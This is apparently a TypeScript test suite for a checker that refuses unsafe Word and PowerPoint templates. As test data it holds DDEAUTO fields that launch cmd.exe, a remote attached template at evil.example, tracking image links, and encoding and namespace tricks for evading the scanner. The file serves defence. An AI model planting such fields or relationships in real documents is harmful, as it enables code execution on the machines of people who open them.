// make_file's .docx / .pptx template (QA TC-4948): pandoc copies the template's headers, footers, settings, masters and
// layouts into every new file, and any file the person can read may be a template now. A field that runs or fetches
// something (DDE, DDEAUTO, INCLUDETEXT, INCLUDEPICTURE, LINK, ...), an external relationship (an attached template, a
// linked picture, an OLE object, a frame, a subdocument) or an embedded object refuses the template; a plain hyperlink
// and ordinary fields (page numbers, dates) do not. Checked in the office worker (files/office-template.ts).
import fs from 'node:fs'
import path from 'node:path'
import { afterAll, beforeAll, describe, expect, setDefaultTimeout, test } from 'bun:test'
import { which } from '../../server/src/config'
import { checkOfficeTemplate, fieldWords } from '../../server/src/files/office-template'
import { readZip, writeZip } from '../../server/src/files/zip-write'
import { makeHandler } from '../../server/src/mcp/protocol'
import { makeCApp, type CApp } from '../lib/c-app'

setDefaultTimeout(60_000)
const pandoc = which('pandoc')
const withPandoc = pandoc ? test : test.skip

function made(md: string, to: 'docx' | 'pptx'): Uint8Array {
  const r = Bun.spawnSync([pandoc!, '-f', 'markdown', '-t', to, '-o', '-'], { stdin: Buffer.from(md) })
  if (r.exitCode !== 0) throw new Error(r.stderr.toString())
  return new Uint8Array(r.stdout)
}
const edit = (b: Uint8Array, name: string, f: (x: string) => string) =>
  writeZip(readZip(b).map((e) => (e.name === name ? { name: e.name, data: new TextEncoder().encode(f(new TextDecoder().decode(e.data))) } : e)))
const addPart = (b: Uint8Array, name: string, x: string) => writeZip([...readZip(b), { name, data: new TextEncoder().encode(x) }])
const R = (type: string, target: string, external = true) => `<Relationship Id="rIdX9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/${type}" Target="${target}"${external ? ' TargetMode="External"' : ''}/>`
const inBody = (b: Uint8Array, xml: string) => edit(b, 'word/document.xml', (x) => x.replace('</w:body>', `<w:p>${xml}</w:p></w:body>`))
const complex = (instr: string[]) => `<w:r><w:fldChar w:fldCharType="begin"/></w:r>${instr.map((i) => `<w:r><w:instrText xml:space="preserve">${i}</w:instrText></w:r>`).join('')}<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>x</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r>`

describe('template check (office-template.ts)', () => {
  test('field words: complex fields joined across runs, nested ones, simple ones', () => {
    expect(fieldWords(`<w:p xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">${complex([' DDE', 'AUTO c:\\\\x "a" '])}</w:p>`)).toEqual(['DDEAUTO'])
    expect(fieldWords(`<w:p xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:fldSimple w:instr=" includePicture &quot;http://x/a.png&quot;"/></w:p>`)).toEqual(['INCLUDEPICTURE'])
    const nested = `<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>IF 1 = 1 </w:instrText></w:r>${complex(['LINK Excel.Sheet "c:\\\\a.xlsx"'])}<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r>`
    expect(fieldWords(`<w:p xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">${nested}</w:p>`).sort()).toEqual(['IF', 'LINK'])
    expect(fieldWords(`<w:p xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">${complex([' PAGE '])}</w:p>`)).toEqual(['PAGE'])
  })

  withPandoc('Word: unsafe fields in body or header, external or object relationships, macros: refused; page numbers and hyperlinks pass', () => {
    const base = made('# T\n\n[site](https://example.com)\n', 'docx')
    expect(() => checkOfficeTemplate('docx', base)).not.toThrow()
    expect(() => checkOfficeTemplate('docx', inBody(base, complex([' PAGE '])))).not.toThrow()
    for (const f of ['DDEAUTO cmd "/c calc"', 'DDE x y', 'INCLUDETEXT "http://x/a.docx"', 'INCLUDEPICTURE "http://x/a.png" \\d', 'LINK Excel.Sheet.8 "c:\\\\a.xlsx"', 'IMPORT x']) {
      expect(() => checkOfficeTemplate('docx', inBody(base, complex([f])))).toThrow(/field, which runs or fetches/)
    }
    const header = addPart(base, 'word/header1.xml', `<w:hdr xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:p><w:fldSimple w:instr="DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe &quot;/k calc&quot;"><w:r><w:t>x</w:t></w:r></w:fldSimple></w:p></w:hdr>`)
    expect(() => checkOfficeTemplate('docx', header)).toThrow(/word\/header1\.xml has a DDEAUTO field/)
    const attached = addPart(base, 'word/_rels/settings.xml.rels', `<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${R('attachedTemplate', 'http://evil.example/t.dotm')}</Relationships>`)
    expect(() => checkOfficeTemplate('docx', attached)).toThrow(/attachedTemplate/)
    for (const t of ['oleObject', 'frame', 'subDocument']) expect(() => checkOfficeTemplate('docx', edit(base, 'word/_rels/document.xml.rels', (x) => x.replace('</Relationships>', `${R(t, 'file:///c:/a')}</Relationships>`)))).toThrow(new RegExp(t))
    expect(() => checkOfficeTemplate('docx', edit(base, 'word/_rels/document.xml.rels', (x) => x.replace('</Relationships>', `${R('image', 'http://x/track.png')}</Relationships>`)))).toThrow(/outside the file \(image/)
    expect(() => checkOfficeTemplate('docx', addPart(base, 'word/vbaProject.bin', 'x'))).toThrow(/macros/)
    expect(() => checkOfficeTemplate('docx', addPart(base, 'word/embeddings/oleObject1.bin', 'x'))).toThrow(/embedded object/)
  })

  withPandoc('PowerPoint: a linked picture or an object in a layout is refused; the plain deck passes', () => {
    const deck = made('# A\n\nb\n', 'pptx')
    expect(() => checkOfficeTemplate('pptx', deck)).not.toThrow()
    const linked = edit(deck, 'ppt/slideLayouts/_rels/slideLayout1.xml.rels', (x) => x.replace('</Relationships>', `${R('image', 'http://evil.example/x.png')}</Relationships>`))
    expect(() => checkOfficeTemplate('pptx', linked)).toThrow(/outside the file/)
    const ole = edit(deck, 'ppt/slideMasters/_rels/slideMaster1.xml.rels', (x) => x.replace('</Relationships>', `${R('oleObject', '../embeddings/a.bin', false)}</Relationships>`))
    expect(() => checkOfficeTemplate('pptx', ole)).toThrow(/embedded object/)
  })
})

describe('hostile spellings (security review): quoting, spaces, another prefix, strict namespace', () => {
  withPandoc('relationships with single quotes, spaces around =, odd case: still refused', () => {
    const base = made('# T\n', 'docx')
    const rels = (rel: string) => addPart(base, 'word/_rels/settings.xml.rels', `<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${rel}</Relationships>`)
    expect(() => checkOfficeTemplate('docx', rels(`<Relationship Id='r1' Type='http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate' Target='http://evil.example/t.dotm' TargetMode='External'/>`))).toThrow(/attachedTemplate/)
    expect(() => checkOfficeTemplate('docx', rels(`<Relationship Id = "r1" Type = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target = "http://x/y.png" TargetMode = "External" />`))).toThrow(/outside the file/)
    expect(() => checkOfficeTemplate('docx', rels(`<Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="http://x/y.png" TargetMode=" external "/>`))).toThrow(/outside the file/)
    // a prefixed relationships element is the same element
    expect(() => checkOfficeTemplate('docx', addPart(base, 'word/_rels/settings.xml.rels', `<x:Relationships xmlns:x="http://schemas.openxmlformats.org/package/2006/relationships"><x:Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/aFChunk" Target="a.htm"/></x:Relationships>`))).toThrow(/aFChunk/)
    // an altChunk (aFChunk) inside the file pulls another document in: refused too
    expect(() => checkOfficeTemplate('docx', rels(`<Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/aFChunk" Target="chunk.htm"/>`))).toThrow(/aFChunk/)
    // a DTD or a part that is not well-formed is not vouched for
    expect(() => checkOfficeTemplate('docx', rels(`</Relationships><!DOCTYPE x>`))).toThrow(/well-formed/)
  })
  withPandoc('fields with single quotes, spaces, another WordprocessingML prefix, the strict namespace: still found', () => {
    const base = made('# T\n', 'docx')
    const hdr = (xml: string) => addPart(base, 'word/header9.xml', xml)
    const W = 'http://schemas.openxmlformats.org/wordprocessingml/2006/main'
    expect(() => checkOfficeTemplate('docx', hdr(`<w:hdr xmlns:w="${W}"><w:p><w:fldSimple w:instr = 'DDEAUTO c:\\a "b"'/></w:p></w:hdr>`))).toThrow(/DDEAUTO/)
    expect(() => checkOfficeTemplate('docx', hdr(`<q:hdr xmlns:q="${W}"><q:p><q:r><q:fldChar q:fldCharType='begin'/></q:r><q:r><q:instrText>INCLUDE</q:instrText></q:r><q:r><q:instrText>PICTURE "http://x/a.png"</q:instrText></q:r><q:r><q:fldChar q:fldCharType = "end"/></q:r></q:p></q:hdr>`))).toThrow(/INCLUDEPICTURE/)
    expect(() => checkOfficeTemplate('docx', hdr(`<hdr xmlns="http://purl.oclc.org/ooxml/wordprocessingml/main" xmlns:s="http://purl.oclc.org/ooxml/wordprocessingml/main"><p><fldSimple s:instr="LINK Excel.Sheet x"/></p></hdr>`))).toThrow(/LINK/)
    // a part outside word/ (the main document can be anywhere, named by _rels/.rels and [Content_Types].xml)
    const moved = addPart(base, 'custom/body.dat', `<w:document xmlns:w="${W}"><w:body><w:p><w:fldSimple w:instr="INCLUDETEXT &quot;http://x/a.docx&quot;"/></w:p></w:body></w:document>`)
    expect(() => checkOfficeTemplate('docx', moved)).toThrow(/custom\/body\.dat has a INCLUDETEXT field/)
    expect(() => checkOfficeTemplate('docx', addPart(base, 'docProps/extra.xml', `<x:root xmlns:x="${W}"><x:r><x:fldChar x:fldCharType="begin"/><x:instrText>DDEAUTO a b</x:instrText><x:fldChar x:fldCharType="end"/></x:r></x:root>`))).toThrow(/DDEAUTO/)
    // UTF-16 (either byte order mark, or none) is not scanned as text: refused
    const u16 = (bom: number[], le: boolean) => { const t = Buffer.from(`<w:hdr xmlns:w="${W}"><w:p><w:fldSimple w:instr="DDEAUTO a b"/></w:p></w:hdr>`, 'utf16le'); if (!le) t.swap16(); return new Uint8Array([...bom, ...t]) }
    for (const [bom, le] of [[[0xff, 0xfe], true], [[0xfe, 0xff], false], [[], true]] as [number[], boolean][]) {
      expect(() => checkOfficeTemplate('docx', writeZip([...readZip(base), { name: 'word/header8.xml', data: u16(bom, le) }]))).toThrow(/UTF-16/)
    }
    // an SVG picture with the usual DOCTYPE (Inkscape, Illustrator) is fine; with an internal subset, or a DOCTYPE on
    // anything that is not an SVG, it is not
    const svg = (head: string, root = '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"/>') => addPart(base, 'word/media/logo.svg', `<?xml version="1.0"?>\n${head}\n${root}`)
    expect(() => checkOfficeTemplate('docx', svg('<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">'))).not.toThrow()
    expect(() => checkOfficeTemplate('docx', svg('<!DOCTYPE svg [<!ENTITY a "DDEAUTO">]>'))).toThrow(/well-formed|DTD/)
    expect(() => checkOfficeTemplate('docx', svg('<!DOCTYPE hdr PUBLIC "x" "y">', `<w:hdr xmlns:w="${W}"/>`))).toThrow(/DTD/)
    // only the W3C's SVG 1.0 / 1.1 DTD (QA TC-4966)
    expect(() => checkOfficeTemplate('docx', svg('<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN" "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">'))).not.toThrow()
    expect(() => checkOfficeTemplate('docx', svg('<!DOCTYPE svg PUBLIC "-//Evil//DTD SVG//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">'))).toThrow(/DTD/)
    expect(() => checkOfficeTemplate('docx', svg('<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://evil.example/svg11.dtd">'))).toThrow(/DTD/)
    expect(() => checkOfficeTemplate('docx', svg('<!DOCTYPE svg SYSTEM "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">'))).toThrow(/DTD/)
    // a font, a picture or a .bin part may start with FF FE by chance: fine; UTF-16 XML there is still refused
    for (const name of ['word/fonts/font1.odttf', 'word/media/image9.png', 'word/x.bin']) {
      expect(() => checkOfficeTemplate('docx', writeZip([...readZip(base), { name, data: new Uint8Array([0xff, 0xfe, 0x12, 0x9a, 0x00, 0x01]) }]))).not.toThrow()
      expect(() => checkOfficeTemplate('docx', writeZip([...readZip(base), { name, data: u16([0xff, 0xfe], true) }]))).toThrow(/UTF-16/)
    }
    // white space between the byte order mark and "<" is still XML (review of #1341): a header stored under media/
    const spaced = (bom: number[], le: boolean, lead: string) => {
      const t = Buffer.from(`${lead}<w:hdr xmlns:w="${W}"><w:p><w:fldSimple w:instr="DDEAUTO a b"/></w:p></w:hdr>`, 'utf16le')
      if (!le) t.swap16()
      return new Uint8Array([...bom, ...t])
    }
    for (const [bom, le] of [[[0xff, 0xfe], true], [[0xfe, 0xff], false], [[], true], [[], false]] as [number[], boolean][]) {
      for (const lead of [' ', '\n', '\r\n\t ']) {
        expect(() => checkOfficeTemplate('docx', writeZip([...readZip(base), { name: 'word/media/part.xml', data: spaced(bom, le, lead) }]))).toThrow(/UTF-16/)
      }
    }
    // the same field name in another namespace is not a Word field
    expect(() => checkOfficeTemplate('docx', hdr(`<w:hdr xmlns:w="${W}" xmlns:o="urn:other"><w:p><o:fldSimple o:instr="DDEAUTO x"/></w:p></w:hdr>`))).not.toThrow()
  })
})

describe('make_file refuses an unsafe template and saves nothing', () => {
  let A: CApp
  beforeAll(async () => { A = await makeCApp('sec-office-template') })
  afterAll(async () => { await A.close() })
  let id = 0
  async function make(args: unknown) {
    const h = makeHandler(A.ctx.files, A.ctx.db, A.toolCtx('alice', null))
    const r = await h({ jsonrpc: '2.0', id: ++id, method: 'tools/call', params: { name: 'make_file', arguments: args } })
    return { text: r.result.content[0].text as string, isError: !!r.result.isError }
  }
  withPandoc('a DDEAUTO field in a readable team file: refused; the same file without it works', async () => {
    const base = made('# Letter\n\nhello\n', 'docx')
    const dir = path.join(A.team, 'users/alice/tpl')
    fs.mkdirSync(dir, { recursive: true })
    fs.writeFileSync(path.join(dir, 'bad.docx'), inBody(base, complex(['DDEAUTO cmd "/c calc"'])))
    fs.writeFileSync(path.join(dir, 'ok.docx'), base)
    const bad = await make({ content: '# x', format: 'docx', output: 'users/alice/out/bad.docx', template: 'users/alice/tpl/bad.docx' })
    expect(bad.isError).toBe(true)
    expect(bad.text).toContain('cannot be used as a template')
    expect(bad.text).toContain('DDEAUTO')
    expect(fs.existsSync(path.join(A.team, 'users/alice/out/bad.docx'))).toBe(false)
    const ok = await make({ content: '# x', format: 'docx', output: 'users/alice/out/ok.docx', template: 'users/alice/tpl/ok.docx' })
    expect(ok.isError, ok.text).toBe(false)
  })
})
